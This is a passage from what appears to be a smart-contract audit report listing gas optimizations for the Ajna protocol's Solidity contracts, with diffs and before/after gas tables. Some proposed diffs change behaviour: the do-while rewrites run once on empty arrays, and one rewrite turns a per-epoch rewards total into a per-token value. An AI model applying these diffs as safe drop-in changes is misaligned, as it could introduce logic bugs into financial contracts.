         // revert if msg.sender already voted on proposal
-        if (hasVotedExtraordinary[proposalId_][msg.sender]) revert AlreadyVoted();
+        mapping(address => bool) storage _hasVoted = hasVotedExtraordinary[proposalId_];
+        if (_hasVoted[msg.sender]) revert AlreadyVoted();

         ExtraordinaryFundingProposal storage proposal = _extraordinaryFundingProposals[proposalId_];
         // revert if proposal is inactive
@@ -145,7 +146,7 @@ abstract contract ExtraordinaryFunding is Funding, IExtraordinaryFunding {
         proposal.votesReceived += SafeCast.toUint120(votesCast_);

         // record that voter has voted on this extraordinary funding proposal
-        hasVotedExtraordinary[proposalId_][msg.sender] = true;
+        _hasVoted[msg.sender] = true;

         emit VoteCast(
             msg.sender,
```

https://github.com/code-423n4/2023-05-ajna/blob/main/ajna-grants/src/grants/base/StandardFunding.sol#L248-L255

*Gas Savings for `GrantFund.claimDelegateReward`, obtained via protocol's tests: Avg 64 gas*

|        |    Max   |
| ------ | -------- |
| Before |   65340  |  
| After  |   65276  | 

### Cache storage pointer for `hasClaimedRewards[distributionId_]`
```solidity
File: ajna-grants/src/grants/base/StandardFunding.sol
248:        if(hasClaimedReward[distributionId_][msg.sender]) revert RewardAlreadyClaimed();
249:
250:        QuadraticVoter memory voter = _quadraticVoters[distributionId_][msg.sender];
251:
252:        // calculate rewards earned for voting
253:        rewardClaimed_ = _getDelegateReward(currentDistribution, voter);
254:
255:        hasClaimedReward[distributionId_][msg.sender] = true;
```
```diff
diff --git a/src/grants/base/StandardFunding.sol b/src/grants/base/StandardFunding.sol
index 928b337..623b47a 100644
--- a/src/grants/base/StandardFunding.sol
+++ b/src/grants/base/StandardFunding.sol
@@ -245,14 +245,15 @@ abstract contract StandardFunding is Funding, IStandardFunding {
         if(block.number < _getChallengeStageEndBlock(currentDistribution.endBlock)) revert ChallengePeriodNotEnded();

         // check rewards haven't already been claimed
-        if(hasClaimedReward[distributionId_][msg.sender]) revert RewardAlreadyClaimed();
+        mapping(address => bool) storage _hasClaimedReward = hasClaimedReward[distributionId_];
+        if(_hasClaimedReward[msg.sender]) revert RewardAlreadyClaimed();

         QuadraticVoter memory voter = _quadraticVoters[distributionId_][msg.sender];

         // calculate rewards earned for voting
         rewardClaimed_ = _getDelegateReward(currentDistribution, voter);

-        hasClaimedReward[distributionId_][msg.sender] = true;
+        _hasClaimedReward[msg.sender] = true;

         emit DelegateRewardClaimed(
             msg.sender,
```

https://github.com/code-423n4/2023-05-ajna/blob/main/ajna-grants/src/grants/base/StandardFunding.sol#L706-L743

*Gas Savings for `GrantFund.screeningVote`, obtained via protocol's tests: Avg 1850 gas*

|        |    Max   |
| ------ | -------- |
| Before |   399146 |  
| After  |   397296 | 

### Cache storage pointer for `screeningVotesCast[distributionId]`
```solidity
File: ajna-grants/src/grants/base/StandardFunding.sol
706:        if (screeningVotesCast[distributionId][account_] + votes_ > _getVotesScreening(distributionId, account_)) revert InsufficientVotingPower();
...
743:        screeningVotesCast[proposal_.distributionId][account_] += votes_;
```
```diff
diff --git a/src/grants/base/StandardFunding.sol b/src/grants/base/StandardFunding.sol
index 928b337..094a83c 100644
--- a/src/grants/base/StandardFunding.sol
+++ b/src/grants/base/StandardFunding.sol
@@ -703,7 +703,8 @@ abstract contract StandardFunding is Funding, IStandardFunding {
         uint24 distributionId = proposal_.distributionId;

         // check that the voter has enough voting power to cast the vote
-        if (screeningVotesCast[distributionId][account_] + votes_ > _getVotesScreening(distributionId, account_)) revert InsufficientVotingPower();
+        mapping(address => uint256) storage _screeningVotesCast = screeningVotesCast[distributionId];
+        if (_screeningVotesCast[account_] + votes_ > _getVotesScreening(distributionId, account_)) revert InsufficientVotingPower();

         uint256[] storage currentTopTenProposals = _topTenProposals[distributionId];
         uint256 proposalId = proposal_.proposalId;
@@ -740,7 +741,7 @@ abstract contract StandardFunding is Funding, IStandardFunding {
         }

         // record voters vote
-        screeningVotesCast[proposal_.distributionId][account_] += votes_;
+        _screeningVotesCast[account_] += votes_;

         // emit VoteCast instead of VoteCastWithParams to maintain compatibility with Tally
         emit VoteCast(
```

## [G-07] Multiple address mappings can be combined into a single mapping of an address to a struct, where appropriate
We can combine multiple mappings below into structs. We can then pack the structs by modifying the `uint type` for the values. This will result in cheaper storage reads since multiple mappings are accessed in functions and those values are now occupying the same storage slot, meaning the slot will become warm after the first SLOAD. In addition, when writing to and reading from the struct values we will avoid a `Gsset (20000 gas)` and `Gcoldsload (2100 gas)` since multiple struct values are now occupying the same slot.

**Note: These are instances missed by the automated report**

https://github.com/code-423n4/2023-05-ajna/blob/main/ajna-grants/src/grants/base/StandardFunding.sol#L106-L112

*Gas Savings for `GrantFund.claimDelegateReward`, obtained via protocol's tests: Avg 22146 gas*

|        |    Max   |
| ------ | -------- |
| Before |   65340  |  
| After  |   43194  | 

```solidity
File: ajna-grants/src/grants/base/StandardFunding.sol
106:    mapping(uint256 => mapping(address => bool)) public hasClaimedReward;
107:
108:    /**
109:     * @notice Mapping of distributionId to user address to total votes cast on screening stage proposals.
110:     * @dev distributionId => address => uint256
111:    */
112:    mapping(uint256 => mapping(address => uint256)) public screeningVotesCast;
```
```diff
diff --git a/src/grants/base/StandardFunding.sol b/src/grants/base/StandardFunding.sol
index 928b337..9985766 100644
--- a/src/grants/base/StandardFunding.sol
+++ b/src/grants/base/StandardFunding.sol
@@ -99,17 +99,12 @@ abstract contract StandardFunding is Funding, IStandardFunding {
     */
     mapping(uint256 => bool) internal _isSurplusFundsUpdated;

-    /**
-     * @notice Mapping of distributionId to user address to whether user has claimed his delegate reward
-     * @dev distributionId => address => bool
-    */
-    mapping(uint256 => mapping(address => bool)) public hasClaimedReward;
+    struct UserInfo {
+        uint248 screeningVotesCast;
+        bool hasClaimedReward;
+    }

-    /**
-     * @notice Mapping of distributionId to user address to total votes cast on screening stage proposals.
-     * @dev distributionId => address => uint256
-    */
-    mapping(uint256 => mapping(address => uint256)) public screeningVotesCast;
+    mapping(uint256 => mapping(address => UserInfo)) public userInfo;

     /**************************************************/
     /*** Distribution Management Functions External ***/
@@ -237,7 +232,8 @@ abstract contract StandardFunding is Funding, IStandardFunding {
         uint24 distributionId_
     ) external override returns(uint256 rewardClaimed_) {
         // Revert if delegatee didn't vote in screening stage
-        if(screeningVotesCast[distributionId_][msg.sender] == 0) revert DelegateRewardInvalid();
+        UserInfo storage _userInfo = userInfo[distributionId_][msg.sender];
+        if(_userInfo.screeningVotesCast == 0) revert DelegateRewardInvalid();

         QuarterlyDistribution memory currentDistribution = _distributions[distributionId_];

@@ -245,14 +241,14 @@ abstract contract StandardFunding is Funding, IStandardFunding {
         if(block.number < _getChallengeStageEndBlock(currentDistribution.endBlock)) revert ChallengePeriodNotEnded();

         // check rewards haven't already been claimed
-        if(hasClaimedReward[distributionId_][msg.sender]) revert RewardAlreadyClaimed();
+        if(_userInfo.hasClaimedReward) revert RewardAlreadyClaimed();

         QuadraticVoter memory voter = _quadraticVoters[distributionId_][msg.sender];

         // calculate rewards earned for voting
         rewardClaimed_ = _getDelegateReward(currentDistribution, voter);

-        hasClaimedReward[distributionId_][msg.sender] = true;
+        _userInfo.hasClaimedReward = true;

         emit DelegateRewardClaimed(
             msg.sender,
@@ -703,7 +699,8 @@ abstract contract StandardFunding is Funding, IStandardFunding {
         uint24 distributionId = proposal_.distributionId;

         // check that the voter has enough voting power to cast the vote
-        if (screeningVotesCast[distributionId][account_] + votes_ > _getVotesScreening(distributionId, account_)) revert InsufficientVotingPower();
+        UserInfo storage _userInfo = userInfo[distributionId][account_];
+        if (_userInfo.screeningVotesCast + votes_ > _getVotesScreening(distributionId, account_)) revert InsufficientVotingPower();

         uint256[] storage currentTopTenProposals = _topTenProposals[distributionId];
         uint256 proposalId = proposal_.proposalId;
@@ -740,7 +737,7 @@ abstract contract StandardFunding is Funding, IStandardFunding {
         }

         // record voters vote
-        screeningVotesCast[proposal_.distributionId][account_] += votes_;
+        _userInfo.screeningVotesCast += uint248(votes_);

         // emit VoteCast instead of VoteCastWithParams to maintain compatibility with Tally
         emit VoteCast(
```

https://github.com/code-423n4/2023-05-ajna/blob/main/ajna-core/src/PositionManager.sol#L52-L57

**Please note that in the [automated report](https://gist.github.com/CloudEllie/a4655b833548ed9a86a63eb7292bcc0f#g01-multiple-addressid-mappings-can-be-combined-into-a-single-mapping-of-an-addressid-to-a-struct-where-appropriate) the `poolKey` mapping was not included in the findings**.

*Gas Savings for `PositionManager.permit`, obtained via protocol's tests: Avg 21833 gas*

|        |    Max   |
| ------ | -------- |
| Before |   54387  |  
| After  |   32554  | 

*Gas Savings for `PositionManager.burn`, obtained via protocol's tests: Avg 1927 gas*

|        |    Max   |
| ------ | -------- |
| Before |   10451  |  
| After  |   8524   | 

```solidity
File: ajna-core/src/PositionManager.sol
52:    mapping(uint256 => address) public override poolKey;
53:
54:    /// @dev Mapping of `token id => ajna pool address` for which token was minted.
55:    mapping(uint256 => mapping(uint256 => Position)) internal positions;
56:    /// @dev Mapping of `token id => nonce` value used for permit.
57:    mapping(uint256 => uint96)                       internal nonces;
```
```diff
diff --git a/src/PositionManager.sol b/src/PositionManager.sol
index 261fbc1..ca903f4 100644
--- a/src/PositionManager.sol
+++ b/src/PositionManager.sol
@@ -48,13 +48,15 @@ contract PositionManager is ERC721, PermitERC721, IPositionManager, Multicall, R
     /*** State Variables ***/
     /***********************/

-    /// @dev Mapping of `token id => ajna pool address` for which token was minted.
-    mapping(uint256 => address) public override poolKey;
+    struct TokenInfo {
+        address poolKey;
+        uint96 nonces;
+    }
+
+    mapping(uint256 => TokenInfo) tokenInfo;

     /// @dev Mapping of `token id => ajna pool address` for which token was minted.
     mapping(uint256 => mapping(uint256 => Position)) internal positions;
-    /// @dev Mapping of `token id => nonce` value used for permit.
-    mapping(uint256 => uint96)                       internal nonces;
     /// @dev Mapping of `token id => bucket indexes` associated with position.
     mapping(uint256 => EnumerableSet.UintSet)        internal positionIndexes;

@@ -104,7 +106,7 @@ contract PositionManager is ERC721, PermitERC721, IPositionManager, Multicall, R
         if (!_isApprovedOrOwner(msg.sender, tokenId_)) revert NoAuth();

         // revert if the token id is not minted for given pool address
-        if (pool_ != poolKey[tokenId_]) revert WrongPool();
+        if (pool_ != tokenInfo[tokenId_].poolKey) revert WrongPool();

         _;
     }
@@ -121,6 +123,10 @@ contract PositionManager is ERC721, PermitERC721, IPositionManager, Multicall, R
         erc721PoolFactory = erc721Factory_;
     }

+    function poolKey(uint256 tokenId_) external view returns (address) {
+        return tokenInfo[tokenId_].poolKey;
+    }
+
     /********************************/
     /*** Owner External Functions ***/
     /********************************/
@@ -146,8 +152,7 @@ contract PositionManager is ERC721, PermitERC721, IPositionManager, Multicall, R
         if (positionIndexes[params_.tokenId].length() != 0) revert LiquidityNotRemoved();

         // remove permit nonces and pool mapping for burned token
-        delete nonces[params_.tokenId];
-        delete poolKey[params_.tokenId];
+        delete tokenInfo[params_.tokenId];

         _burn(params_.tokenId);

@@ -172,7 +177,7 @@ contract PositionManager is ERC721, PermitERC721, IPositionManager, Multicall, R
     ) external override {
         EnumerableSet.UintSet storage positionIndex = positionIndexes[params_.tokenId];

-        IPool   pool  = IPool(poolKey[params_.tokenId]);
+        IPool   pool  = IPool(tokenInfo[params_.tokenId].poolKey);
         address owner = ownerOf(params_.tokenId);

         uint256 indexesLength = params_.indexes.length;
@@ -233,7 +238,7 @@ contract PositionManager is ERC721, PermitERC721, IPositionManager, Multicall, R
         if (!_isAjnaPool(params_.pool, params_.poolSubsetHash)) revert NotAjnaPool();

         // record which pool the tokenId was minted in
-        poolKey[tokenId_] = params_.pool;
+        tokenInfo[tokenId_].poolKey = params_.pool;

         _mint(params_.recipient, tokenId_);

@@ -404,7 +409,7 @@ contract PositionManager is ERC721, PermitERC721, IPositionManager, Multicall, R
     function _getAndIncrementNonce(
         uint256 tokenId_
     ) internal override returns (uint256) {
-        return uint256(nonces[tokenId_]++);
+        return uint256(tokenInfo[tokenId_].nonces++);
     }

     /**
@@ -452,7 +457,7 @@ contract PositionManager is ERC721, PermitERC721, IPositionManager, Multicall, R
         uint256 index_
     ) external override view returns (uint256) {
         Position memory position = positions[tokenId_][index_];
-        return _bucketBankruptAfterDeposit(IPool(poolKey[tokenId_]), index_, position.depositTime) ? 0 : position.lps;
+        return _bucketBankruptAfterDeposit(IPool(tokenInfo[tokenId_].poolKey), index_, position.depositTime) ? 0 : position.lps;
     }

     /// @inheritdoc IPositionManagerDerivedState
@@ -472,7 +477,7 @@ contract PositionManager is ERC721, PermitERC721, IPositionManager, Multicall, R
         // filter out bankrupt buckets
         filteredIndexes_ = new uint256[](indexesLength);
         uint256 filteredIndexesLength = 0;
-        IPool pool = IPool(poolKey[tokenId_]);
+        IPool pool = IPool(tokenInfo[tokenId_].poolKey);
         for (uint256 i = 0; i < indexesLength; ) {
             if (!_bucketBankruptAfterDeposit(pool, indexes[i], positions[tokenId_][indexes[i]].depositTime)) {
                 filteredIndexes_[filteredIndexesLength++] = indexes[i];
@@ -500,7 +505,7 @@ contract PositionManager is ERC721, PermitERC721, IPositionManager, Multicall, R
         uint256 tokenId_,
         uint256 index_
     ) external view override returns (bool) {
-        return _bucketBankruptAfterDeposit(IPool(poolKey[tokenId_]), index_, positions[tokenId_][index_].depositTime);
+        return _bucketBankruptAfterDeposit(IPool(tokenInfo[tokenId_].poolKey), index_, positions[tokenId_][index_].depositTime);
     }

     /// @inheritdoc IPositionManagerDerivedState
@@ -519,14 +524,14 @@ contract PositionManager is ERC721, PermitERC721, IPositionManager, Multicall, R
     ) public view override(ERC721) returns (string memory) {
         require(_exists(tokenId_));

-        address collateralTokenAddress = IPool(poolKey[tokenId_]).collateralAddress();
-        address quoteTokenAddress      = IPool(poolKey[tokenId_]).quoteTokenAddress();
+        address collateralTokenAddress = IPool(tokenInfo[tokenId_].poolKey).collateralAddress();
+        address quoteTokenAddress      = IPool(tokenInfo[tokenId_].poolKey).quoteTokenAddress();

         PositionNFTSVG.ConstructTokenURIParams memory params = PositionNFTSVG.ConstructTokenURIParams({
             collateralTokenSymbol: tokenSymbol(collateralTokenAddress),
             quoteTokenSymbol:      tokenSymbol(quoteTokenAddress),
             tokenId:               tokenId_,
-            pool:                  poolKey[tokenId_],
+            pool:                  tokenInfo[tokenId_].poolKey,
             owner:                 ownerOf(tokenId_),
             indexes:               positionIndexes[tokenId_].values()
         });
```

The instance below requires modifications to `IRewardsManagerState.sol` (out of scope) and the tests, and therefore is not included in the final diffs. I will explain this optimization for completeness: The `isEpochClaimed` nested mapping and the `rewardsClaimed` mapping are both accessed when the `claimRewards` function is called (this function invokes other internal functions that write to and read from these mappings). The same `tokenId_` that is used in the `isEpochClaimed` nested mapping is available each time `rewardsClaimed` is read from or written to. Since rewards are claimed for specific tokens, it stands to reason that both these mappings can be combined into a single nested mapping that points to a struct. We can then pack `rewardsClaimed` and `isEpochClaimed` into a single slot by changing the uint of `rewardsClaimed` to `uint248`. Doing so will allow us to avoid a `Gsset (20_000 gas)` when both values are written to and one `Gcoldsload (2100 gas)` when both values are read.

**The diff included below is only to showcase the necessary changes needed for `RewardsManager.sol`. Those changes will not work unless `IRewardsManagerState.sol` and the tests are changed as well**.

**Please note that in the [automated report](https://gist.github.com/CloudEllie/a4655b833548ed9a86a63eb7292bcc0f#g01-multiple-addressid-mappings-can-be-combined-into-a-single-mapping-of-an-addressid-to-a-struct-where-appropriate) the `isEpochClaimed` mapping was not included in the findings**.

https://github.com/code-423n4/2023-05-ajna/blob/main/ajna-core/src/RewardsManager.sol#L70-L72

Estimated Gas Savings: `~22100` (`Gsset (20_000 gas)` + `Gcoldsload (2100 gas)`)

```solidity
File: ajna-core/src/RewardsManager.sol
70:    mapping(uint256 => mapping(uint256 => bool)) public override isEpochClaimed;
71:    /// @dev `epoch => rewards claimed` mapping.
72:    mapping(uint256 => uint256) public override rewardsClaimed;
```
```diff
diff --git a/src/RewardsManager.sol b/src/RewardsManager.sol
index 314b476..e7b2252 100644
--- a/src/RewardsManager.sol
+++ b/src/RewardsManager.sol
@@ -66,10 +66,13 @@ contract RewardsManager is IRewardsManager, ReentrancyGuard {
     /*** State Variables ***/
     /***********************/

-    /// @dev `tokenID => epoch => bool has claimed` mapping.
-    mapping(uint256 => mapping(uint256 => bool)) public override isEpochClaimed;
-    /// @dev `epoch => rewards claimed` mapping.
-    mapping(uint256 => uint256) public override rewardsClaimed;
+    struct EpochInfo {
+        uint248 rewardsClaimed;
+        bool isEpochClaimed;
+    }
+
+    mapping(uint256 => mapping(uint256 => EpochInfo)) epochInfo;
+
     /// @dev `epoch => update bucket rate rewards claimed` mapping.
     mapping(uint256 => uint256) public override updateRewardsClaimed;

@@ -99,6 +102,16 @@ contract RewardsManager is IRewardsManager, ReentrancyGuard {
         positionManager = positionManager_;
     }

+    function isEpochClaimed(uint256 tokenId_, uint256 epoch_) external view returns (bool) {
+        return epochInfo[tokenId_][epoch_].isEpochClaimed;
+    }
+
+    function rewardsClaimed(uint256 tokenId_, uint256 epoch_) external view returns (uint256) {
+        // need to modify out of scope interface file and tests for this to work.
+        return uint256(epochInfo[tokenId_][epoch_].rewardsClaimed);
+    }
+
+
     /**************************/
     /*** External Functions ***/
     /**************************/
@@ -119,7 +132,7 @@ contract RewardsManager is IRewardsManager, ReentrancyGuard {

         if (msg.sender != stakeInfo.owner) revert NotOwnerOfDeposit();

-        if (isEpochClaimed[tokenId_][epochToClaim_]) revert AlreadyClaimed();
+        if (epochInfo[tokenId_][epochToClaim_].isEpochClaimed) revert AlreadyClaimed();

         _claimRewards(stakeInfo, tokenId_, epochToClaim_, true, stakeInfo.ajnaPool);
     }
@@ -408,8 +421,8 @@ contract RewardsManager is IRewardsManager, ReentrancyGuard {
             unchecked { ++epoch; }

             // update epoch token claim trackers
-            rewardsClaimed[epoch]           += nextEpochRewards;
-            isEpochClaimed[tokenId_][epoch] = true;
+            epochInfo[tokenId_][epoch].rewardsClaimed += uint248(nextEpochRewards);
+            epochInfo[tokenId_][epoch].isEpochClaimed = true;
         }
     }

@@ -432,7 +445,7 @@ contract RewardsManager is IRewardsManager, ReentrancyGuard {
     ) internal view returns (uint256 epochRewards_) {

         uint256 nextEpoch = epoch_ + 1;
-        uint256 claimedRewardsInNextEpoch = rewardsClaimed[nextEpoch];
+        uint256 claimedRewardsInNextEpoch = uint256(epochInfo[tokenId_][nextEpoch].rewardsClaimed);
         uint256 bucketIndex;
         uint256 interestEarned;

```

## [G-08] Usage of uints/ints smaller than 32 bytes (256 bits) incurs overhead
The EVM operates with 32 byte words. Therefore, if you declare state variables less than 32 bytes the EVM will need to perform extra operations to cast your value to the specified size.

Total Instances: `2`

https://github.com/code-423n4/2023-05-ajna/blob/main/ajna-grants/src/grants/base/StandardFunding.sol#L63

*Gas Savings for `GrantFund.startNewDistributionPeriod`, obtained via protocol's tests: Avg 218 gas*

|        |    Max   |
| ------ | -------- |
| Before |   75597  |  
| After  |   75379  | 

```solidity
File: ajna-grants/src/grants/base/StandardFunding.sol
63:    uint24 internal _currentDistributionId = 0;
```
```diff
diff --git a/src/grants/base/StandardFunding.sol b/src/grants/base/StandardFunding.sol
index 928b337..971e285 100644
--- a/src/grants/base/StandardFunding.sol
+++ b/src/grants/base/StandardFunding.sol
@@ -60,7 +60,7 @@ abstract contract StandardFunding is Funding, IStandardFunding {
      * @dev Updated at the start of each quarter.
      * @dev Monotonically increases by one per period.
      */
-    uint24 internal _currentDistributionId = 0;
+    uint256 internal _currentDistributionId = 0;

     /**
      * @notice Mapping of quarterly distributions from the grant fund.
@@ -117,8 +117,8 @@ abstract contract StandardFunding is Funding, IStandardFunding {

     /// @inheritdoc IStandardFunding
     function startNewDistributionPeriod() external override returns (uint24 newDistributionId_) {
-        uint24  currentDistributionId       = _currentDistributionId;
-        uint256 currentDistributionEndBlock = _distributions[currentDistributionId].endBlock;
+        uint256  currentDistributionId       = _currentDistributionId;
+        uint256 currentDistributionEndBlock = _distributions[uint24(currentDistributionId)].endBlock;

         // check that there isn't currently an active distribution period
         if (block.number <= currentDistributionEndBlock) revert DistributionPeriodStillActive();
@@ -128,13 +128,13 @@ abstract contract StandardFunding is Funding, IStandardFunding {
             // Check if any last distribution exists and its challenge stage is over
             if (currentDistributionId > 0 && (block.number > _getChallengeStageEndBlock(currentDistributionEndBlock))) {
                 // Add unused funds from last distribution to treasury
-                _updateTreasury(currentDistributionId);
+                _updateTreasury(uint24(currentDistributionId));
             }

             // checks if any second last distribution exist and its unused funds are not added into treasury
             if (currentDistributionId > 1 && !_isSurplusFundsUpdated[currentDistributionId - 1]) {
                 // Add unused funds from second last distribution to treasury
-                _updateTreasury(currentDistributionId - 1);
+                _updateTreasury(uint24(currentDistributionId) - 1);
             }
         }

@@ -225,7 +225,7 @@ abstract contract StandardFunding is Funding, IStandardFunding {
      * @return newId_ The new distribution period Id.
      */
     function _setNewDistributionId() private returns (uint24 newId_) {
-        newId_ = _currentDistributionId += 1;
+        newId_ = uint24(_currentDistributionId += 1);
     }

     /************************************/
@@ -376,7 +376,7 @@ abstract contract StandardFunding is Funding, IStandardFunding {
         // check for duplicate proposals
         if (newProposal.proposalId != 0) revert ProposalAlreadyExists();

-        QuarterlyDistribution memory currentDistribution = _distributions[_currentDistributionId];
+        QuarterlyDistribution memory currentDistribution = _distributions[uint24(_currentDistributionId)];

         // cannot add new proposal after end of screening period
         // screening period ends 72000 blocks before end of distribution period, ~ 80 days.
@@ -519,9 +519,9 @@ abstract contract StandardFunding is Funding, IStandardFunding {
     function fundingVote(
         FundingVoteParams[] memory voteParams_
     ) external override returns (uint256 votesCast_) {
-        uint24 currentDistributionId = _currentDistributionId;
+        uint256 currentDistributionId = _currentDistributionId;

-        QuarterlyDistribution storage currentDistribution = _distributions[currentDistributionId];
+        QuarterlyDistribution storage currentDistribution = _distributions[uint24(currentDistributionId)];
         QuadraticVoter        storage voter               = _quadraticVoters[currentDistributionId][msg.sender];

         uint256 endBlock = currentDistribution.endBlock;
@@ -572,7 +572,7 @@ abstract contract StandardFunding is Funding, IStandardFunding {
     function screeningVote(
         ScreeningVoteParams[] memory voteParams_
     ) external override returns (uint256 votesCast_) {
-        QuarterlyDistribution memory currentDistribution = _distributions[_currentDistributionId];
+        QuarterlyDistribution memory currentDistribution = _distributions[uint24(_currentDistributionId)];

         // check screening stage is active
         if (block.number < currentDistribution.startBlock || block.number > _getScreeningStageEndBlock(currentDistribution.endBlock)) revert InvalidVote();
@@ -926,7 +926,7 @@ abstract contract StandardFunding is Funding, IStandardFunding {

     /// @inheritdoc IStandardFunding
     function getDistributionId() external view override returns (uint24) {
-        return _currentDistributionId;
+        return uint24(_currentDistributionId);
     }

     /// @inheritdoc IStandardFunding
```

https://github.com/code-423n4/2023-05-ajna/blob/main/ajna-core/src/PositionManager.sol#L62

*Gas Savings for `PositionManager.mint`, obtained via protocol's tests: Avg 256 gas*

|        |    Max   |
| ------ | -------- |
| Before |   98876  |  
| After  |   98620  | 

```solidity
File: ajna-core/src/PositionManager.sol
62:    uint176 private _nextId = 1;
```
```diff
diff --git a/src/PositionManager.sol b/src/PositionManager.sol
index 261fbc1..7e186a2 100644
--- a/src/PositionManager.sol
+++ b/src/PositionManager.sol
@@ -59,7 +59,7 @@ contract PositionManager is ERC721, PermitERC721, IPositionManager, Multicall, R
     mapping(uint256 => EnumerableSet.UintSet)        internal positionIndexes;

     /// @dev Id of the next token that will be minted. Skips `0`.
-    uint176 private _nextId = 1;
+    uint256 private _nextId = 1;

     /******************/
     /*** Immutables ***/
```

## [G-09] Use `do while` loops instead of `for` loops
A `do while` loop will cost less gas since the condition is not being checked for the first iteration.

Total Instances: `14`

https://github.com/code-423n4/2023-05-ajna/blob/main/ajna-core/src/RewardsManager.sol#L680-L704

*Gas Savings for `RewardsManager.claimRewards`, obtained via protocol's tests: Avg 90 gas*

|        |    Max   |
| ------ | -------- |
| Before |  393064  |  
| After  |  392974  | 

```solidity
File: ajna-core/src/RewardsManager.sol
680:            for (uint256 i = 0; i < indexes_.length; ) {
...
704:                for (uint256 i = 0; i < indexes_.length; ) {
```
```diff
diff --git a/src/RewardsManager.sol b/src/RewardsManager.sol
index 314b476..ab3ceb6 100644
--- a/src/RewardsManager.sol
+++ b/src/RewardsManager.sol
@@ -677,8 +677,8 @@ contract RewardsManager is IRewardsManager, ReentrancyGuard {

         // update exchange rates only if the pool has not yet burned any tokens without calculating any reward
         if (curBurnEpoch == 0) {
-            for (uint256 i = 0; i < indexes_.length; ) {
-
+            uint256 i;
+            do {
                 _updateBucketExchangeRate(
                     pool_,
                     indexes_[i],
@@ -687,7 +687,7 @@ contract RewardsManager is IRewardsManager, ReentrancyGuard {

                 // iterations are bounded by array length (which is itself bounded), preventing overflow / underflow
                 unchecked { ++i; }
-            }
+            } while(i < indexes_.length);
         }

         else {
@@ -701,8 +701,8 @@ contract RewardsManager is IRewardsManager, ReentrancyGuard {
             if (block.timestamp <= curBurnTime + UPDATE_PERIOD) {

                 // update exchange rates and calculate rewards if tokens were burned and within allowed time period
-                for (uint256 i = 0; i < indexes_.length; ) {
-
+                uint256 i;
+                do {
                     // calculate rewards earned for updating bucket exchange rate
                     updatedRewards_ += _updateBucketExchangeRateAndCalculateRewards(
                         pool_,
@@ -714,7 +714,7 @@ contract RewardsManager is IRewardsManager, ReentrancyGuard {

                     // iterations are bounded by array length (which is itself bounded), preventing overflow / underflow
                     unchecked { ++i; }
-                }
+                } while(i < indexes_.length);

                 uint256 rewardsCap            = Maths.wmul(UPDATE_CAP, totalBurned);
                 uint256 rewardsClaimedInEpoch = updateRewardsClaimed[curBurnEpoch];
```

https://github.com/code-423n4/2023-05-ajna/blob/main/ajna-core/src/RewardsManager.sol#L163

*Gas Savings for `RewardsManager.moveStakedLiquidity`, obtained via protocol's tests: Avg 78 gas*

|        |    Max   |
| ------ | -------- |
| Before |  2112272 |  
| After  |  2112194 | 

```solidity
File: ajna-core/src/RewardsManager.sol
163:        for (uint256 i = 0; i < fromBucketLength; ) {
```
```diff
diff --git a/src/RewardsManager.sol b/src/RewardsManager.sol
index 314b476..008ea99 100644
--- a/src/RewardsManager.sol
+++ b/src/RewardsManager.sol
@@ -160,7 +160,8 @@ contract RewardsManager is IRewardsManager, ReentrancyGuard {

         uint256 fromIndex;
         uint256 toIndex;
-        for (uint256 i = 0; i < fromBucketLength; ) {
+        uint256 i;
+        do {
             fromIndex = fromBuckets_[i];
             toIndex = toBuckets_[i];

@@ -182,7 +183,7 @@ contract RewardsManager is IRewardsManager, ReentrancyGuard {

             // iterations are bounded by array length (which is itself bounded), preventing overflow / underflow
             unchecked { ++i; }
-        }
+        } while (i < fromBucketLength);

         emit MoveStakedLiquidity(tokenId_, fromBuckets_, toBuckets_);
```

https://github.com/code-423n4/2023-05-ajna/blob/main/ajna-core/src/RewardsManager.sol#L396

*Gas Savings for `RewardsManager.claimRewards`, obtained via protocol's tests: Avg 102 gas*

|        |    Max   |
| ------ | -------- |
| Before |  393064  |  
| After  |  392962  | 

```solidity
File: ajna-core/src/RewardsManager.sol
396:        for (uint256 epoch = lastClaimedEpoch; epoch < epochToClaim_; ) {
```
```diff
diff --git a/src/RewardsManager.sol b/src/RewardsManager.sol
index 314b476..bf8c65a 100644
--- a/src/RewardsManager.sol
+++ b/src/RewardsManager.sol
@@ -393,11 +393,10 @@ contract RewardsManager is IRewardsManager, ReentrancyGuard {
         uint256[] memory positionIndexes = positionManager.getPositionIndexesFiltered(tokenId_);

         // iterate through all burn periods to calculate and claim rewards
-        for (uint256 epoch = lastClaimedEpoch; epoch < epochToClaim_; ) {
-
+        do {
             uint256 nextEpochRewards = _calculateNextEpochRewards(
                 tokenId_,
-                epoch,
+                lastClaimedEpoch,
                 stakingEpoch,
                 ajnaPool,
                 positionIndexes
@@ -405,12 +404,12 @@ contract RewardsManager is IRewardsManager, ReentrancyGuard {

             rewards_ += nextEpochRewards;

-            unchecked { ++epoch; }
+            unchecked { ++lastClaimedEpoch; }

             // update epoch token claim trackers
-            rewardsClaimed[epoch]           += nextEpochRewards;
-            isEpochClaimed[tokenId_][epoch] = true;
-        }
+            rewardsClaimed[lastClaimedEpoch]           += nextEpochRewards;
+            isEpochClaimed[tokenId_][lastClaimedEpoch] = true;
+        } while(lastClaimedEpoch < epochToClaim_);
     }
```

https://github.com/code-423n4/2023-05-ajna/blob/main/ajna-core/src/PositionManager.sol#L181-L210

*Gas Savings for `PositionManager.memorializePositions`, obtained via protocol's tests: Avg 134 gas*

|        |    Max   |
| ------ | -------- |
| Before |  1134444 |  
| After  |  1134310 | 

```solidity
File: ajna-core/src/PositionManager.sol
181:        for (uint256 i = 0; i < indexesLength; ) {
182:            index = params_.indexes[i];
183:
184:            // record bucket index at which a position has added liquidity
185:            // slither-disable-next-line unused-return
186:            positionIndex.add(index);
...
206:            // save position in storage
207:            positions[params_.tokenId][index] = position;
208:
209:            unchecked { ++i; }
210:        }
```
```diff
diff --git a/src/PositionManager.sol b/src/PositionManager.sol
index 261fbc1..10fee91 100644
--- a/src/PositionManager.sol
+++ b/src/PositionManager.sol
@@ -177,8 +177,9 @@ contract PositionManager is ERC721, PermitERC721, IPositionManager, Multicall, R

         uint256 indexesLength = params_.indexes.length;
         uint256 index;
-
-        for (uint256 i = 0; i < indexesLength; ) {
+
+        uint256 i;
+        do {
             index = params_.indexes[i];

             // record bucket index at which a position has added liquidity
@@ -207,7 +208,7 @@ contract PositionManager is ERC721, PermitERC721, IPositionManager, Multicall, R
             positions[params_.tokenId][index] = position;

             unchecked { ++i; }
-        }
+        } while(i < indexesLength);

         // update pool LP accounting and transfer ownership of LP to PositionManager contract
         pool.transferLP(owner, address(this), params_.indexes);
```

https://github.com/code-423n4/2023-05-ajna/blob/main/ajna-core/src/PositionManager.sol#L364-L383

